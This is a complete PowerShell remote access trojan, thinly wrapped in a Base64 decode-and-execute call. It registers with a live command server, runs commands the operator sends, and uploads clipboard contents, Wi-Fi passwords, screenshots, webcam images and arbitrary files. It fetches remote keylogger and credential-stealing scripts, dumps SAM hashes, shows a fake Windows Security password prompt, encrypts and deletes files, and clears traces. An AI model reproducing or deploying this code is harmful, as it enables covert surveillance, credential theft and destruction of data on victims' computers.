$e = [System.Convert]::FromBase64String('Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$SERVER_URL = "https://xenv1-9gvd.onrender.com"
$session_id = $env:COMPUTERNAME
$session_username = $env:USERNAME
$session_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" })[0].IPAddress
$session_time = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

function Notify-Connection {
    try {
        # Create a hashtable with named properties
        $body = @{
            session  = $session_id
            time     = $session_time
            username = $session_username
            ip       = $session_ip
        } | ConvertTo-Json

        Invoke-RestMethod -Uri "$SERVER_URL/receive-result" -Method Post -Body $body -ContentType "application/json"
    } catch {
        # Optional: handle or log error here
    }
}

function Restart-System {
    Restart-Computer -Force

}

function Shutdown-System {
    Stop-Computer -Force
}

function Send-TelegramFile {
    param([string]$filePath)

    if (-not ([System.IO.Path]::IsPathRooted($filePath))) {
        $filePath = Join-Path -Path (Get-Location).Path -ChildPath $filePath
    }

    $uri = "$SERVER_URL/files"
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $fileContent = [System.IO.File]::ReadAllBytes($filePath)

    $fields = (
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF" +
        "Content-Type: application/octet-stream$LF$LF"
    )

    $endBoundary = "$LF--$boundary--$LF"
    $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($fields) + $fileContent + [System.Text.Encoding]::ASCII.GetBytes($endBoundary)

    $request = [System.Net.HttpWebRequest]::Create($uri)
    $request.Method = "POST"
    $request.ContentType = "multipart/form-data; boundary=$boundary"
    $request.ContentLength = $bodyBytes.Length

    $requestStream = $request.GetRequestStream()
    $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
    $requestStream.Close()

    try {
        $response = $request.GetResponse()
        $reader = New-Object IO.StreamReader($response.GetResponseStream())
        $reader.ReadToEnd() | Out-Null
        $reader.Close()
    } catch {}
}

function Send-Clipboard {
    try {
        $text = powershell -STA -Command {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.Clipboard]::GetText()
        }

        if (![string]::IsNullOrWhiteSpace($text)) {
            $maxChunkSize = 4096
            $chunks = [System.Collections.Generic.List[string]]::new()
            for ($i = 0; $i -lt $text.Length; $i += $maxChunkSize) {
                $chunk = $text.Substring($i, [Math]::Min($maxChunkSize, $text.Length - $i))
                $chunks.Add($chunk)
            }

            foreach ($chunk in $chunks) {
                $body = @{
                    result = $chunk
                } | ConvertTo-Json -Depth 3

                Invoke-RestMethod -Uri "$SERVER_URL/clipboard" -Method POST -Body $body -ContentType "application/json" | Out-Null
            }
        } else {
            Write-Host "[!] Clipboard is empty."
        }
    } catch {
        Write-Host "[!] Failed to access clipboard: $_"
    }
}


function Kill-AllPowerShellProcesses {
    # Get all PowerShell processes (both 'powershell.exe' and 'pwsh.exe')
    $powershellProcesses = Get-Process -Name "powershell", "pwsh" -ErrorAction SilentlyContinue

    # If there are any PowerShell processes running
    if ($powershellProcesses) {
        foreach ($process in $powershellProcesses) {
            try {
                # Kill the process forcefully
                Stop-Process -Id $process.Id -Force
            } catch {
                # Silently ignore errors (e.g., access denied)
            }
        }
    }
}

function Clear-TempDir {
    # Get the path to the temp directory
    $tempDir = [System.IO.Path]::GetTempPath()

    # Check if the temp directory exists
    if (Test-Path $tempDir) {
        # Flag to track if any file was deleted
        $deletedFiles = $false

        # Remove all files in the temp directory silently
        Get-ChildItem -Path $tempDir -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                # Remove the item and mark as deleted
                Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue
                $deletedFiles = $true
            } catch {
                # Ignore errors silently
            }
        }

        # Print success message if any file was deleted
        if ($deletedFiles) {
        }
    }
}


function Get-WifiPasswords {
    param(
        [string]$SERVER_URL  # pass your server URL here or use global variable
    )

    $send = "$SERVER_URL/system"
    $wifiDetails = @()

    try {
        $profilesOutput = netsh wlan show profiles

        $profileNames = $profilesOutput |
            Where-Object { $_ -match "All User Profile\s*:\s*(.+)" } |
            ForEach-Object {
                if ($_ -match "All User Profile\s*:\s*(.+)") {
                    $matches[1].Trim()
                }
            }

        foreach ($wifiName in $profileNames) {
            $profileDetails = netsh wlan show profile name="$wifiName" key=clear

            if ($profileDetails) {
                # Extract Password
                $passwordMatch = $profileDetails | Select-String -Pattern "Key Content\s*:\s*(.+)"
                $wifiPassword = if ($passwordMatch) {
                    $passwordMatch.Matches[0].Groups[1].Value.Trim()
                } else {
                    "(Not set or hidden)"
                }

                # Extract Authentication Type
                $authMatch = $profileDetails | Select-String -Pattern "Authentication\s*:\s*(.+)"
                $authType = if ($authMatch) {
                    $authMatch.Matches[0].Groups[1].Value.Trim()
                } else {
                    "(Unknown)"
                }

                # Extract Cipher Type
                $cipherMatch = $profileDetails | Select-String -Pattern "Cipher\s*:\s*(.+)"
                $cipherType = if ($cipherMatch) {
                    $cipherMatch.Matches[0].Groups[1].Value.Trim()
                } else {
                    "(Unknown)"
                }

                $wifiDetails += [PSCustomObject]@{
                    WiFiName       = $wifiName
                    Authentication = $authType
                    Cipher         = $cipherType
                    Password       = $wifiPassword
                }
            }
        }

        # Convert whole result to JSON
        $jsonBody = $wifiDetails | ConvertTo-Json -Depth 3

        # Send once to server silently
        Invoke-RestMethod -Uri $send -Method Post -Body $jsonBody -ContentType 'application/json' -ErrorAction SilentlyContinue

    } catch {
        # Ignore errors silently
    }
}




function Set-Wallpaper {
    param(
        [Parameter(Mandatory = $true)]
        [string]$change
    )

    function Invoke-WallpaperChange {
        param([string]$imagePath)

        Add-Type @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

        $SPI_SETDESKWALLPAPER = 0x0014
        $SPIF_UPDATEINIFILE = 0x01
        $SPIF_SENDCHANGE = 0x02

        [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $imagePath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)
    }

    if ($change -match "^https?://") {
        try {
            $fileName = [System.IO.Path]::GetFileName($change)
            $tempPath = Join-Path $env:TEMP $fileName
            Invoke-WebRequest -Uri $change -OutFile $tempPath -UseBasicParsing
            Invoke-WallpaperChange -imagePath $tempPath
        } catch {
            Write-Error "Failed to download or set wallpaper: $_"
        }
    } elseif (Test-Path $change) {
        try {
            Invoke-WallpaperChange -imagePath $change
        } catch {
            Write-Error "Error setting wallpaper: $_"
        }
    } else {
        # Try checking in current directory
        $localPath = Join-Path (Get-Location) $change
        if (Test-Path $localPath) {
            try {
                Invoke-WallpaperChange -imagePath $localPath

            } catch {
                Write-Error "Error setting wallpaper from current directory: $_"
            }
        } else {
            Write-Error "Invalid input: not a valid URL or file path."
        }
    }
}

function Show-SecurityForm {
    # Create the form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "Windows Security"
    $form.Size = New-Object System.Drawing.Size(400,250)
    $form.StartPosition = "CenterScreen"
    $form.BackColor = [System.Drawing.Color]::Black
    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
    $form.MaximizeBox = $false

    # Title Label
    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = "Windows Security"
    $titleLabel.ForeColor = [System.Drawing.Color]::White
    $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 20, [System.Drawing.FontStyle]::Bold)
    $titleLabel.AutoSize = $true
    $titleLabel.Location = New-Object System.Drawing.Point(20,20)
    $form.Controls.Add($titleLabel)

    # Password Label
    $passwordLabel = New-Object System.Windows.Forms.Label
    $passwordLabel.Text = "Enter your password:"
    $passwordLabel.ForeColor = [System.Drawing.Color]::White
    $passwordLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12)
    $passwordLabel.AutoSize = $true
    $passwordLabel.Location = New-Object System.Drawing.Point(20,70)
    $form.Controls.Add($passwordLabel)

    # Password TextBox
    $passwordTextbox = New-Object System.Windows.Forms.TextBox
    $passwordTextbox.Location = New-Object System.Drawing.Point(20,100)
    $passwordTextbox.Size = New-Object System.Drawing.Size(350,30)
    $passwordTextbox.UseSystemPasswordChar = $true
    $form.Controls.Add($passwordTextbox)

    # Submit Button
    $submitButton = New-Object System.Windows.Forms.Button
    $submitButton.Text = "OK"
    $submitButton.Location = New-Object System.Drawing.Point(150,180)
    $submitButton.Size = New-Object System.Drawing.Size(100,30)
    $submitButton.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
    $submitButton.ForeColor = [System.Drawing.Color]::White
    $form.Controls.Add($submitButton)

    # 🔹 Handle click to send password to Node.js API
    $submitButton.Add_Click({
        if ([string]::IsNullOrWhiteSpace($passwordTextbox.Text)) {
            $errorLabel.Text = "You must enter a password."
        } else {
            $password = $passwordTextbox.Text
            $message = "Phishing Credentials: `nPassword: $password"
            
            # Send the password to the result API (Node.js server)
            $resultAPI = "$SERVER_URL/phishing"  # Your Node.js API endpoint

            $body = @{
                result = $password
            } | ConvertTo-Json

            Invoke-RestMethod -Uri $resultAPI -Method Post -Body $body -ContentType "application/json"

            # Close the form after sending the password
            $form.Close()
        }
    })

    # Show the form
    $form.Add_Shown({ $form.Activate() })
    $form.ShowDialog() | Out-Null
}

function Format-Response {
    param([hashtable]$data)
    
    $formatted = @()
    $formatted += "copy"
    foreach ($key in $data.Keys) {
        $value = $data[$key]
        if ($value -is [array]) {
            $value = $value -join ","
        }
        $formatted += "$($key.PadRight(15)): $value"
    }
    return $formatted -join "`n"
}

function Encrypt-FileWithPassword {
    param (
        [string]$filePath
    )

    $password = "KAKSDFKAKSJJFN121kkk###1249010204919mlmkakskfnkla9999))??"

    # Generate AES key and IV from the password using PBKDF2
    $salt = [byte[]]@([System.Text.Encoding]::UTF8.GetBytes("SomeRandomSalt"))
    $iterations = 10000
    $keyLength = 32  # AES-256
    $ivLength = 16   # AES block size (128 bits)

    # Deriving the key and IV from the password
    $keyDerivation = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
    $aesKey = $keyDerivation.GetBytes($keyLength)
    $aesIV = $keyDerivation.GetBytes($ivLength)

    # Keep original extension and add ".enc"
    $encryptedFilePath = "$filePath.enc"

    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $aesKey
        $aes.IV = $aesIV
        $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)

        # Open input/output streams
        $fileStream = [System.IO.File]::OpenRead($filePath)
        $encryptedStream = [System.IO.File]::Create($encryptedFilePath)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($encryptedStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

        # Read & write in chunks
        $buffer = New-Object byte[] 1024
        while (($bytesRead = $fileStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $cryptoStream.Write($buffer, 0, $bytesRead)
        }

        $cryptoStream.Close()
        $fileStream.Close()
        $encryptedStream.Close()

        # Optionally remove the original file
        Remove-Item -Path $filePath -Force

        return "File encrypted successfully: $encryptedFilePath"
    }
    catch {
        return "Error during encryption: $_"
    }
}

function Decrypt-FileWithPassword {
    param (
        [string]$filePath
    )

    $password = "KAKSDFKAKSJJFN121kkk###1249010204919mlmkakskfnkla9999))??"

    # Generate AES key and IV from the password using PBKDF2
    $salt = [byte[]]@([System.Text.Encoding]::UTF8.GetBytes("SomeRandomSalt"))
    $iterations = 10000
    $keyLength = 32  # AES-256
    $ivLength = 16   # AES block size (128 bits)

    # Deriving the key and IV from the password
    $keyDerivation = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
    $aesKey = $keyDerivation.GetBytes($keyLength)
    $aesIV = $keyDerivation.GetBytes($ivLength)

    $decryptedFilePath = $filePath -replace '\.enc$', ''

    try {
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $aesKey
        $aes.IV = $aesIV
        $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)

        # Open the encrypted file for reading and create a new file for writing the decrypted data
        $encryptedStream = [System.IO.File]::OpenRead($filePath)
        $decryptedStream = [System.IO.File]::OpenWrite($decryptedFilePath)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($encryptedStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)

        # Buffer for reading and writing data
        $buffer = New-Object byte[] 1024
        $bytesRead = 0
        while (($bytesRead = $cryptoStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $decryptedStream.Write($buffer, 0, $bytesRead)
        }

        $cryptoStream.Close()
        $encryptedStream.Close()
        $decryptedStream.Close()

        # Remove the encrypted file after decryption
        Remove-Item -Path $filePath -Force

        return "File decrypted successfully: $decryptedFilePath"
    }
    catch {
        return "Error during decryption: $_"
    }
}

function Fetch-BrowserData {
    # Run the dump + upload fully in background, hidden, async

    $script = {
        $OutputPath = [System.IO.Path]::Combine($env:TEMP, "result.txt")

        # Download and prepare the script
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "$Env:TMP\Invoke-WDigest.ps1"
        Unblock-File -Path "$Env:TMP\Invoke-WDigest.ps1"

        # Run the script silently, redirect output to file
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$Env:TMP\Invoke-WDigest.ps1`" -banner false -wdigest false -browsercreds" -WindowStyle Hidden -Wait -RedirectStandardOutput $OutputPath

        # Remove temp script
        Remove-Item -Path "$Env:TMP\Invoke-WDigest.ps1" -Force

        # Send the file to the server
        # Re-import Send-TelegramFile function to this runspace (or redefine it here)
        function Send-TelegramFile {
            param([string]$filePath)

            $SERVER_URL = "https://xenv1-9gvd.onrender.com"
            if (-not ([System.IO.Path]::IsPathRooted($filePath))) {
                $filePath = Join-Path -Path (Get-Location).Path -ChildPath $filePath
            }

            $uri = "$SERVER_URL/files"
            $fileName = [System.IO.Path]::GetFileName($filePath)
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"

            $fileContent = [System.IO.File]::ReadAllBytes($filePath)

            $fields = (
                "--$boundary$LF" +
                "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF" +
                "Content-Type: application/octet-stream$LF$LF"
            )

            $endBoundary = "$LF--$boundary--$LF"
            $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($fields) + $fileContent + [System.Text.Encoding]::ASCII.GetBytes($endBoundary)

            $request = [System.Net.HttpWebRequest]::Create($uri)
            $request.Method = "POST"
            $request.ContentType = "multipart/form-data; boundary=$boundary"
            $request.ContentLength = $bodyBytes.Length

            $requestStream = $request.GetRequestStream()
            $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
            $requestStream.Close()

            try {
                $response = $request.GetResponse()
                $reader = New-Object IO.StreamReader($response.GetResponseStream())
                $reader.ReadToEnd() | Out-Null
                $reader.Close()
            } catch {}
        }

        Send-TelegramFile -filePath $OutputPath
    }

    # Start the background job
    Start-Job -ScriptBlock $script | Out-Null
    # Dont wait for it - this is async
}

function Fetch-telegram-data {
    # Define the URL where the keylogger script is hosted
    $url = "https://raw.githubusercontent.com/wagner012/wagner/refs/heads/main/td.ps1"

    # Define the path where we will save the file
    $tempPath = [System.IO.Path]::Combine($env:TEMP, "test.ps1")

    # Download the file to the temp path
    Invoke-WebRequest -Uri $url -OutFile $tempPath

    # Run the downloaded file silently (in the background)
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$tempPath"` -WindowStyle Hidden
}

function Start-Keylogger {
    # Define the URL where the keylogger script is hosted
    $url = "https://raw.githubusercontent.com/wagner012/wagner/refs/heads/main/key.ps1"

    # Define the path where we will save the file
    $tempPath = [System.IO.Path]::Combine($env:TEMP, "test.ps1")

    # Download the file to the temp path
    Invoke-WebRequest -Uri $url -OutFile $tempPath

    # Run the downloaded file silently (in the background)
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$tempPath"` -WindowStyle Hidden
}

function Stop-Keylogger {
    # Get all running PowerShell processes
    $psProcesses = Get-Process powershell -ErrorAction SilentlyContinue

    foreach ($proc in $psProcesses) {
        try {
            # Check if the command line contains "test.ps1"
            $commandLine = (Get-CimInstance Win32_Process -Filter "ProcessId = $($proc.Id)").CommandLine
            if ($commandLine -like "*test.ps1*") {
                Stop-Process -Id $proc.Id -Force
            }
        } catch {
            # Handle access errors silently
        }
    }
}

function WebcamCapture {
    $tempDir = [System.IO.Path]::GetTempPath()
    $exeUrl = "https://github.com/wagner012/wagner/raw/refs/heads/main/test.exe"
    $dll1Url = "https://github.com/wagner012/wagner/raw/refs/heads/main/AForge.Video.dll"
    $dll2Url = "https://github.com/wagner012/wagner/raw/refs/heads/main/AForge.Video.DirectShow.dll"

    $exePath = Join-Path $tempDir "test.exe"
    $dll1Path = Join-Path $tempDir "AForge.Video.dll"
    $dll2Path = Join-Path $tempDir "AForge.Video.DirectShow.dll"

    if (-not (Test-Path $exePath)) { Invoke-WebRequest $exeUrl -OutFile $exePath }
    if (-not (Test-Path $dll1Path)) { Invoke-WebRequest $dll1Url -OutFile $dll1Path }
    if (-not (Test-Path $dll2Path)) { Invoke-WebRequest $dll2Url -OutFile $dll2Path }

    $capturedImagePath = Join-Path $tempDir "photo.jpg"
    Start-Process -FilePath $exePath -WorkingDirectory $tempDir -WindowStyle Hidden -Wait

    if (Test-Path $capturedImagePath) {
        Send-TelegramFile -filePath $capturedImagePath
        Remove-Item -Path $capturedImagePath -Force
    }
}

function Capture-And-Send-Screenshot {
    param (
        [string]$SERVER_URL
    )

    # Create a new runspace for background execution
    $runspace = [RunspaceFactory]::CreateRunspace()
    $runspace.Open()

    $ps = [PowerShell]::Create()
    $ps.Runspace = $runspace

    $ps.AddScript({

        param($SERVER_URL)

        function Send-TelegramFile {
            param([string]$filePath)

            try {
                if (-not ([System.IO.Path]::IsPathRooted($filePath))) {
                    $filePath = Join-Path -Path (Get-Location).Path -ChildPath $filePath
                }

                $uri = "$SERVER_URL/files"
                $fileName = [System.IO.Path]::GetFileName($filePath)
                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"

                $fileContent = [System.IO.File]::ReadAllBytes($filePath)

                $fields = (
                    "--$boundary$LF" +
                    "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF" +
                    "Content-Type: application/octet-stream$LF$LF"
                )

                $endBoundary = "$LF--$boundary--$LF"
                $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($fields) + $fileContent + [System.Text.Encoding]::ASCII.GetBytes($endBoundary)

                $request = [System.Net.HttpWebRequest]::Create($uri)
                $request.Method = "POST"
                $request.ContentType = "multipart/form-data; boundary=$boundary"
                $request.ContentLength = $bodyBytes.Length

                $requestStream = $request.GetRequestStream()
                $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
                $requestStream.Close()

                $response = $request.GetResponse()
                $reader = New-Object IO.StreamReader($response.GetResponseStream())
                $reader.ReadToEnd() | Out-Null
                $reader.Close()
            } catch {}
        }

        try {
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing

            # Set process DPI awareness
            $dpiAwareCode = @"
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
}
"@
            Add-Type -TypeDefinition $dpiAwareCode
            [NativeMethods]::SetProcessDPIAware() | Out-Null

            # Capture screenshot
            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $bitmap.Size)

            $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
            $tempFile = Join-Path -Path ([System.IO.Path]::GetTempPath()) -ChildPath "screenshot_$timestamp.png"
            $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)

            $graphics.Dispose()
            $bitmap.Dispose()

            Send-TelegramFile -filePath $tempFile

            if (Test-Path $tempFile) {
                Remove-Item -Path $tempFile -Force
            }
        } catch {
            Write-Warning "Screenshot capture failed: $($_.Exception.Message)"
        }

    }).AddArgument($SERVER_URL)

    # Begin background execution
    $null = $ps.BeginInvoke()

    return "Screenshot capture started in background."
}

function Get-SystemInfo {
    $send = "$SERVER_URL/system"

    $username = $env:USERNAME
    $private_ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress
    $mac_address = (Get-NetAdapter | Select-Object -ExpandProperty MacAddress)
    $user_privilege = if (([Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match "S-1-5-32-544") { "Administrator" } else { "Standard User" }
    $os_version = (Get-CimInstance Win32_OperatingSystem).Caption
    $batter_per = (Get-WmiObject -Class Win32_Battery).EstimatedChargeRemaining.ToString() + "%"

    # Convert to plain text format (no quotes or braces)
    $resultText = @"
Battery: $batter_per
User_Privilege: $user_privilege
OS_Version: $os_version
Username: $username
Mac_Address: $mac_address
Private_IP: $private_ip
"@

    $data = @{ result = $resultText } | ConvertTo-Json -Depth 3

    Invoke-RestMethod -Uri $send -Method Post -Body $data -ContentType 'application/json'
}

function Get-LocalAccounts {
    try {
        $accounts = Get-CimInstance Win32_UserAccount -Filter 'LocalAccount=True' |
            Select-Object Name, SID, PasswordRequired, PasswordChangeable

        if (-not $accounts) {
            return
        }

        $payload = @{ result = $accounts }
        $jsonBody = $payload | ConvertTo-Json -Depth 3

        Invoke-RestMethod -Uri "$SERVER_URL/system" -Method POST -Body $jsonBody -ContentType "application/json" -TimeoutSec 10
    }
    catch {
        # silently ignore errors or you can log if needed
    }
}

$jobScript = {
    param($serverUrl)

    function Send-TelegramFile {
        param([string]$filePath)

        if (-not ([System.IO.Path]::IsPathRooted($filePath))) {
            $filePath = Join-Path -Path (Get-Location).Path -ChildPath $filePath
        }

        if (-not (Test-Path -Path $filePath)) {
            Write-Error "File not found: $filePath"
            return
        }

        $uri = "$serverUrl/files"
        $fileName = [System.IO.Path]::GetFileName($filePath)
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"

        $fileContent = [System.IO.File]::ReadAllBytes($filePath)

        $header = "--$boundary$LF" +
                  "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF" +
                  "Content-Type: application/octet-stream$LF$LF"
        $footer = "$LF--$boundary--$LF"

        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header)
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)

        $bodyBytes = New-Object byte[] ($headerBytes.Length + $fileContent.Length + $footerBytes.Length)
        [System.Buffer]::BlockCopy($headerBytes, 0, $bodyBytes, 0, $headerBytes.Length)
        [System.Buffer]::BlockCopy($fileContent, 0, $bodyBytes, $headerBytes.Length, $fileContent.Length)
        [System.Buffer]::BlockCopy($footerBytes, 0, $bodyBytes, $headerBytes.Length + $fileContent.Length, $footerBytes.Length)

        try {
            $request = [System.Net.HttpWebRequest]::Create($uri)
            $request.Method = "POST"
            $request.ContentType = "multipart/form-data; boundary=$boundary"
            $request.ContentLength = $bodyBytes.Length

            $requestStream = $request.GetRequestStream()
            $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
            $requestStream.Close()

            $response = $request.GetResponse()
            $reader = New-Object IO.StreamReader($response.GetResponseStream())
            $responseContent = $reader.ReadToEnd()
            $reader.Close()
            $response.Close()

            Write-Host "File uploaded successfully."
        }
        catch {
            Write-Error "Error uploading file: $_"
        }
    }

    function Invoke-CredentialDump {
        Write-Host " * Dump credentials from registry hives." -ForegroundColor Green
        Write-Host ""

        $isAdmin = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match "S-1-5-32-544"

        if ($isAdmin) {
            $tempPath = $Env:TEMP
            $dumpScript = Join-Path $tempPath "Invoke-Dump.ps1"
            $dumpUrl = "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Sam/Invoke-Dump.ps1"
            $outputFile = Join-Path $tempPath "hashes.txt"

            try {
                Set-Location -Path $tempPath
                Invoke-WebRequest -Uri $dumpUrl -OutFile $dumpScript -UseBasicParsing
                Unblock-File -Path $dumpScript
                Import-Module -Name $dumpScript -Force

                Invoke-Dump | Out-File -FilePath $outputFile -Encoding UTF8

                Send-TelegramFile -filePath $outputFile

                Remove-Item -Path $dumpScript -Force

                Write-Host " * Credentials dumped to $outputFile" -ForegroundColor Cyan
            }
            catch {
                Write-Error "Failed during credential dump process: $_"
            }
        }
        else {
            $errorLog = Join-Path $Env:TEMP "fddds.log"
            "   > Error: administrator privileges required." | Out-File -FilePath $errorLog
            Get-Content -Path $errorLog
            Remove-Item -Path $errorLog -Force
        }
    }

    Invoke-CredentialDump
}

function Open-url ($url) {
    Start-Process $url
}

function Fetch-Command {
    try {
        return (Invoke-RestMethod -Uri "$SERVER_URL/last-command/$session_id" -Method Get).command
    } catch {
        return $null
    }
}

function Send-Result($result) {
    try {
        if ($result -is [hashtable]) {
            $result = Format-Response -data $result
        } elseif ($result -is [System.Array]) {
            $result = $result -join "`n"
        }

        $body = @{
            session = $session_id
            result = $result
        } | ConvertTo-Json -Depth 3

        Invoke-RestMethod -Uri "$SERVER_URL/command-result" -Method Post -Body $body -ContentType "application/json"
    } catch {}
}

$global:currentDirectory = Get-Location

function Execute($command) {
    try {
        if ($command -match '^cd\s+(.+)$') {
            $target = $Matches[1].Trim()

            if ($target -eq "..") {
                $parent = Split-Path -Path $global:currentDirectory -Parent
                if (-not [string]::IsNullOrWhiteSpace($parent)) {
                    $global:currentDirectory = $parent
                }
                return "Moved up to: $global:currentDirectory"
            } else {
                $newPath = Join-Path -Path $global:currentDirectory -ChildPath $target
                if (Test-Path $newPath -PathType Container) {
                    $global:currentDirectory = $newPath
                    return "Changed directory to: $global:currentDirectory"
                } else {
                    return "Directory not found: $target"
                }
            }
        } else {
            $output = powershell.exe -NoLogo -NoProfile -Command "Set-Location '$global:currentDirectory'; $command" 2>&1
            return $output | Out-String
        }
    } catch {
        return "Execution failed: $_"
    }
}

function Get-LocalAccounts {

    try {
        $accounts = Get-WmiObject Win32_UserAccount -Filter 'LocalAccount=True' |
            Select-Object Name, SID, PasswordRequired, PasswordChangeable

        if (-not $accounts) {
            return
        }

        # Wrap in 'result' property
        $payload = @{ result = $accounts }
        $jsonBody = $payload | ConvertTo-Json -Depth 3

        Invoke-RestMethod -Uri "$SERVER_URL/system" -Method POST -Body $jsonBody -ContentType "application/json"

        $accounts | Format-Table -AutoSize
    }
    catch {
    }
}


function Main {
    Notify-Connection
    $last_command = ""

    try {
        while ($true) {
            $command = Fetch-Command
            if ($command -and $command -ne $last_command) {
                Write-Host "[+] Executing: $command"

                $commandParts = $command.Split(" ", 2)
                $mainCommand = $commandParts[0]
                $commandArgument = if ($commandParts.Count -gt 1) { $commandParts[1].Trim() } else { "" }

                switch ($mainCommand) {
                    "Get-SystemInfo" {
                         Get-SystemInfo
                         $result = $null
                    }
                    "screenshot" {
                        $null = Write-Host (Capture-And-Send-Screenshot -SERVER_URL $SERVER_URL)
                        $result = $null
                    }
                    "webcam" {
                        WebcamCapture
                        $result = $null
                    }
                    "Open-url" {
                        Open-url $commandArgument
                        $result = $null
                    }
                    "keyloggeron" {
                        Start-Keylogger
                        $result = $null
                    }
                    "keyloggeroff" {
                        Stop-Keylogger
                        $result = $null
                    }
                    "file_encrypt" {
                        $result = Encrypt-FileWithPassword -filePath $commandArgument
                    }
                    "file_decrypt" {
                        $result = Decrypt-FileWithPassword -filePath $commandArgument
                    }
                    "download_file" {
                        Send-TelegramFile -filePath $commandArgument
                        $result = $null
                    }
                    "fetch_wifi_creds" {
                        $result = Get-WifiPasswords
                    }
                    "change_wallpaper" {
                        Set-Wallpaper $commandArgument
                        $result = $null
                    }
                    "kill_session" {
                        Kill-AllPowerShellProcesses
                        $result = $null
                    }
                    "clear_trace" {
                        Clear-TempDir
                        $result = $null
                    }
                    "browser_data" {
                        Fetch-BrowserData
                        $result = $null
                    }
                    "clipboard_data" {
                        Send-Clipboard
                        $result = $null
                    }
                    "phishing" {
                        Show-SecurityForm
                        $result = $null

                    }
                    "shutdown_system" {
                        Shutdown-System
                        $result = $null

                    }
                    "restart_system" {
                        Restart-System
                        $result = $null

                    }
                    "telegram_data" {
                        Fetch-telegram-data
                        $result = $null
                    }
                    "dumpsam_hashes" {
                        Start-Job -ScriptBlock $jobScript -ArgumentList $SERVER_URL | Out-Null
                        $result = $null
                    }
                    "dump_accounts" {
                        Get-LocalAccounts
                        $result = $null
                    }
                    default {
                        $result = Execute $command
                    }
                }

                if ($result) {
                    Send-Result $result
                }

                $last_command = $command
            }

            Start-Sleep -Seconds 5
        }
    }
    finally {
        try {
            $body = @{ session = $session_id } | ConvertTo-Json
            Invoke-RestMethod -Uri "$SERVER_URL/disconnect" -Method Post -Body $body -ContentType "application/json"
        } catch {}
    }
}

Main
'); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated
